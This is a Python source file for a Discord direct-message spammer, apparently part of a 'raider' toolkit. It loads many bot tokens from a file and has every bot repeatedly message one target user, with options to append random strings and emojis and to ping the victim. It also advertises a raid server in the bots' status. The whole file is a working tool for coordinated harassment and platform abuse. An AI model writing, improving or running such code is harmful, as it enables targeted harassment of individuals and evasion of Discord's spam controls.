from assets import *

r = Fore.RESET
c = Fore.RED
g = Fore.LIGHTBLACK_EX
s = Fore.BLACK
x = Fore.GREEN
k = Fore.YELLOW

dark_red_color = Fore.RED
light_green_color = '\033[92m'
grey_color = '\033[90m'
reset_color = '\033[0m'

RED = Fore.RED
RESET = "\033[0m"

timestamp = datetime.datetime.now().strftime(f'{c}[{g}%H:%M:%S{c}]{c}')

def load_tokens():
    tokens_file = 'assets/input/bot_tokens.txt'
    tokens = []
    try:
        with open(tokens_file, 'r') as file:
            tokens = [line.strip() for line in file.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"[ERROR] Tokens file '{tokens_file}' not found.")
    return tokens

def generate_random_string(length=5):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

banner = f"""                                
                                {k}[WARNING]{k} {g}>{g} {c}Dont put any offensive words like n word{c}
                                {c}[REASON]{c} {g}>{g} {c}Your bots will get banned by discord{c}
                                {Fore.RED} _____ _____ _____ _____ _____ _____ _____ 
                                |     |   __| __  |     |  |  | __  |   __|
                                | | | |   __|    -|   --|  |  |    -|   __|
                                \033[90m|_|_|_|_____|__|__|_____|_____|__|__|_____|
"""

def generate_random_emojis():
    emojis = ['"😀😓🤢🤮🤓☠😸🤡🥵', '😎😋😂🤣🤨🤔🤐😫🥱', '😂🥰😘😍👺‍🙀😹😡🤩', '🥳😴😐🤐🥰😛😂😍🤮', '😈😐😶😘😮😀🤣😂😐', '😙😯🙄😍😥😘😛😴👻']
    return random.choice(emojis)

async def spam(token, target, message, count, use_random_string, use_emojis, ping_user, set_rich_presence):
    try:
        intents = discord.Intents.all()
        client = discord.Client(intents=intents)

        @client.event
        async def on_ready():
            await asyncio.sleep(1)

            try:
                target_user = await client.fetch_user(int(target))
            except discord.NotFound:
                print(f"[FAILED] Couldn't find user")
                await client.close()
                return

            if set_rich_presence:
                activity = discord.Activity(type=discord.ActivityType.watching, name="discord.gg/mercureraider")
                await client.change_presence(activity=activity)

            for _ in range(count):
                msg = message

                if use_random_string:
                    random_string = generate_random_string()
                    msg += f" | ~>[{random_string}]"

                if use_emojis:
                    random_emojis = generate_random_emojis()
                    msg += f" | ~>[{random_emojis}]"

                if ping_user:
                    msg += f" | ~>[<@{target_user.id}>]"

                try:
                    await target_user.send(msg)
                    print(f"                       {timestamp} {c}[SUCCESS] Sent message to {target_user.name} | {token[:len(token)//2]}******")

                except discord.Forbidden:
                    print(f"                       {timestamp} {c}[FAILED] {target_user.name} DMs are closed | {token[:len(token)//2]}******")
                    continue
                except Exception as e:
                    print(f"                       {timestamp} {c}[ERROR] An error occurred: {str(e)}")
                    break

                await asyncio.sleep(0.5)

            await client.close()

        await client.start(token)

    except discord.LoginFailure:
        print(f"                       {timestamp} {c}[FAILED] Invalid Token | {token[:len(token)//2]}******")
    except Exception as e:
        print(f"                        {timestamp} {c}[ERROR] An error occurred: {str(e)}")

def loginmsg(username, token):
    print(f"                        {timestamp} {c} [SUCCESS] Logged in as {username} | {token[:len(token)//2]}******")

async def dm_spammer():
    tokens_loaded = input(f"                                {timestamp} {c}[?] got tokens in assets/input/bot_tokens.txt?{c} {g}(y/n){g} {c}> {c}")

    if tokens_loaded.lower() == 'y':
        os.system('cls')
        print(banner)
        target = input(f"                                {timestamp} {c}[?] [User ID] {c}> {c}")
        message = input(f"                                {timestamp} {c}[?] [Message] {c}> {c}")
        message_amount = int(input(f"                                {timestamp} {c}[?] [Msg Amount] {c}> {c}"))

        use_random_string = input(f"                                {timestamp} {c}[?] [Random strings? {g}(y/n) {Fore.RED}] {Fore.RED}> {Fore.RED}").lower() == 'y'
        use_emojis = input(f"                                {timestamp} {c}[?] [Emojis? {g}(y/n) {Fore.RED}] {Fore.RED}> {Fore.RED}").lower() == 'y'
        ping_user = input(f"                                {timestamp} {c}[?] [Ping User? {g}(y/n) {c}] {c}> {c}").lower() == 'y'

        set_rich_presence = input(f"                                {timestamp} {c}[?] rich presence?{c} {g}(y/n){g} {c}> {c}").lower() == 'y'

        if set_rich_presence:
            rich_presence = "discord.gg/mercureraider"

        tokens = load_tokens()

        async def execute_spam(token):
            await spam(token, target, message, message_amount, use_random_string, use_emojis, ping_user, set_rich_presence)

        tasks = [execute_spam(token) for token in tokens]

        await asyncio.gather(*tasks)

    else:
        os.system('exit')